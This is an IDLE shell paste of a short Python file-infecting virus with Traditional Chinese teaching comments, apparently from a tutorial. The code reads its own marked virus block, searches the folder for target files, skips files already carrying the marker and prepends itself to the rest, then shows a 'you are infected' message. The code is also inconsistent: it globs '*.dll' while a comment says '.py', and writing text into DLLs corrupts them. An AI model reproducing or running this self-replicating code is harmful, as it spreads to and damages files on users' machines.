Python 3.7.5 (tags/v3.7.5:5c02a39a0b, Oct 15 2019, 00:11:34) [MSC v.1916 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license()" for more information.
>>> #!/usr/bin/env python      #<-這行是告訴unix類作業系統，這個程式調用usr/bin下面的

                                             #python檔案解譯此程式，windows的話不用管它

##### VIRUS BEGIN #####    

import sys,glob,re,os

#複製病毒自身的程式碼    #<-插入自己的程式碼到別人那邊，病毒要打開自己

                                            #的檔案並複製下自己的程式碼。

vCode = []   #<-儲存病毒碼的串列

fh = open(sys.argv[0],"r",encoding='utf-8-sig')  #<-自己開啟自己的檔案，

  #sys.argv[0]表示自己的path。

  #用utf-8-sig的方式解碼檔案(python原始檔的編碼方式就是用utf-8，一般中文版

  #windows記事本通常用cp950，包含在ansi架構下)

lines = fh.readlines()   #<-逐行讀取，回傳一個串列，串列中每個元素是一行文字
fh.close()
inVirus = False
for line in lines:          #<-這個迴圈會把病毒碼的部分存到vCode串列裡
    result = re.search('^##### VIRUS BEGIN #####',line)
    if (result != None):
       inVirus = True
    if (inVirus): 
       vCode.append(line)
    result2 = re.search('^##### VIRUS END #####',line)
    if (result2 != None):
       break

#<-從Virus Begin到Virus End是程式標示病毒碼的部分

#尋找可感染的目標

progs = glob.glob("*.dll")   #<-把所有同資料夾內.py檔的路徑存到progs串列內

#檢查目標是否已經被感染，若尚未被感染才會插入自己的病毒碼

for prog in progs:
    fh = open(prog,"r",encoding='utf-8-sig')
    pCode = fh.readlines()
    fh.close()
    infected = False
    for line in pCode:
        if ('##### VIRUS BEGIN #####' in line):
           infected = True
           break
    if not infected:
       newCode = []
       newCode.extend(vCode)
       newCode.extend(pCode)
       #Writing new virus infected code
       fh = open(prog,'w',encoding='utf-8-sig')
       fh.writelines(newCode)
       fh.close()
        

#病毒發作的程式碼(Payload)

x=input('你中毒了!\n請按任意鍵繼續')

##### VIRUS END #####
